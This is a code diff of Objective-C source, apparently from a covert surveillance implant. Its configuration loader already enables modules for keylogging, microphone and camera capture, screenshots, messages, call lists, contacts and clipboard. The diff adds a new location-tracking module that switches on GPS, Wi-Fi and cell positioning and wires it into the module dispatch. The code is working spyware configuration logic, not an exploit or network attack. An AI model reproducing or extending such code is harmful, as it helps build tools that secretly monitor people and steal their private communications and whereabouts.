@@ -493,7 +493,7 @@
 - (void)initClipboardModule: (NSDictionary *)aModule
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-  
+
   id enabled = AGENT_ENABLED;
   NSArray *keys = nil;
   NSArray *objects = nil;
@@ -502,10 +502,11 @@
   
   NSNumber *type  = [NSNumber numberWithUnsignedInt: AGENT_CLIPBOARD];
   NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
+
   
   if (status == nil || [status boolValue] == FALSE)
     enabled = AGENT_DISABLED;
-  
+
   keys = [NSArray arrayWithObjects: @"agentID",
                                     @"status",
                                     @"data",
@@ -524,6 +525,60 @@
   [mAgentsList addObject: moduleConfiguration];
   
   [moduleConfiguration release];
+
+  [pool release];
+}
+
+- (void)initPositionModule: (NSDictionary *)aModule
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  id enabled = AGENT_ENABLED;
+  NSArray *keys = nil;
+  NSArray *objects = nil;
+  UInt32 positionModulesStatus= POS_MODULES_ALL_DISABLE;
+  
+  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
+  
+  NSNumber *type  = [NSNumber numberWithUnsignedInt: AGENT_POSITION];
+  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
+  NSNumber *gpsStatus = [aModule objectForKey: @"gps"];
+  NSNumber *wifiStatus = [aModule objectForKey: @"wifi"];
+  NSNumber *cellStatus = [aModule objectForKey: @"cell"];
+  
+  if ([gpsStatus boolValue] == TRUE)
+    positionModulesStatus |= POS_MODULES_GPS_ENABLE;
+  if ([wifiStatus boolValue] == TRUE)
+    positionModulesStatus |= POS_MODULES_WIF_ENABLE;
+  if ([cellStatus boolValue] == TRUE)
+    positionModulesStatus |= POS_MODULES_CEL_ENABLE;
+  
+  if (status == nil || [status boolValue] == FALSE)
+    enabled = AGENT_DISABLED;
+  
+  NSData *data = [[NSData alloc] initWithBytes: &positionModulesStatus 
+                                        length: sizeof(positionModulesStatus)];
+  
+  keys = [NSArray arrayWithObjects: @"agentID",
+                                    @"status",
+                                    @"data",
+                                    nil];
+  
+  objects = [NSArray arrayWithObjects: type, 
+                                       enabled, 
+                                       data,
+                                       nil];
+  
+  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
+                                                         forKeys: keys];
+  
+  [moduleConfiguration addEntriesFromDictionary: dictionary];
+  
+  [mAgentsList addObject: moduleConfiguration];
+  
+  [moduleConfiguration release];
+  
+  [data release];
   
   [pool release];
 }
@@ -690,54 +745,58 @@ typedef struct _message_config_t {
     
     if (moduleType != nil)
       {
-      if ([moduleType compare: MODULES_ADDBK_KEY] == NSOrderedSame) 
-        {
-        [self initABModule: module];
-        }
-      else if ([moduleType compare: MODULES_DEV_KEY] == NSOrderedSame) 
-        {
-        [self initDeviceModule: module];
-        }
-      else if ([moduleType compare: MODULES_CALL_KEY] == NSOrderedSame) 
-        {
-        [self initCalllistModule: module];
-        }
-      else if ([moduleType compare: MODULES_CAL_KEY] == NSOrderedSame) 
-        {
-        [self initCalendarModule: module];
-        }
-      else if ([moduleType compare: MODULES_MIC_KEY] == NSOrderedSame) 
-        {
-        [self initMicModule: module];
-        }
-      else if ([moduleType compare: MODULES_SNP_KEY] == NSOrderedSame) 
-        {
-        [self initScrshotModule: module];
-        }
-      else if ([moduleType compare: MODULES_URL_KEY] == NSOrderedSame) 
-        {
-        [self initUrlModule: module];
-        }
-      else if ([moduleType compare: MODULES_APP_KEY] == NSOrderedSame) 
-        {
-        [self initAppModule: module];
-        }      
-      else if ([moduleType compare: MODULES_KEYL_KEY] == NSOrderedSame) 
-        {
-        [self initKeyLogModule: module];
-        }
-      else if ([moduleType compare: MODULES_MSGS_KEY] == NSOrderedSame) 
-        {
-        [self initMessagesModule: module];
-        }
-      else if ([moduleType compare: MODULES_CLIP_KEY] == NSOrderedSame) 
-        {
-        [self initClipboardModule: module];
-        }
-      else if ([moduleType compare: MODULES_CAMERA_KEY] == NSOrderedSame) 
-        {
-        [self initCameraModule: module];
-        }
+        if ([moduleType compare: MODULES_ADDBK_KEY] == NSOrderedSame) 
+          {
+            [self initABModule: module];
+          }
+        else if ([moduleType compare: MODULES_DEV_KEY] == NSOrderedSame) 
+          {
+            [self initDeviceModule: module];
+          }
+        else if ([moduleType compare: MODULES_CALL_KEY] == NSOrderedSame) 
+          {
+            [self initCalllistModule: module];
+          }
+        else if ([moduleType compare: MODULES_CAL_KEY] == NSOrderedSame) 
+          {
+            [self initCalendarModule: module];
+          }
+        else if ([moduleType compare: MODULES_MIC_KEY] == NSOrderedSame) 
+          {
+            [self initMicModule: module];
+          }
+        else if ([moduleType compare: MODULES_SNP_KEY] == NSOrderedSame) 
+          {
+            [self initScrshotModule: module];
+          }
+        else if ([moduleType compare: MODULES_URL_KEY] == NSOrderedSame) 
+          {
+            [self initUrlModule: module];
+          }
+        else if ([moduleType compare: MODULES_APP_KEY] == NSOrderedSame) 
+          {
+            [self initAppModule: module];
+          }      
+        else if ([moduleType compare: MODULES_KEYL_KEY] == NSOrderedSame) 
+          {
+            [self initKeyLogModule: module];
+          }
+        else if ([moduleType compare: MODULES_MSGS_KEY] == NSOrderedSame) 
+          {
+            [self initMessagesModule: module];
+          }
+        else if ([moduleType compare: MODULES_CLIP_KEY] == NSOrderedSame) 
+          {
+            [self initClipboardModule: module];
+          }
+        else if ([moduleType compare: MODULES_CAMERA_KEY] == NSOrderedSame) 
+          {
+            [self initCameraModule: module];
+          }
+        else if ([moduleType compare: MODULES_POSITION_KEY] == NSOrderedSame) 
+          {
+            [self initPositionModule: module];
+          }
       }
     
     [inner release];
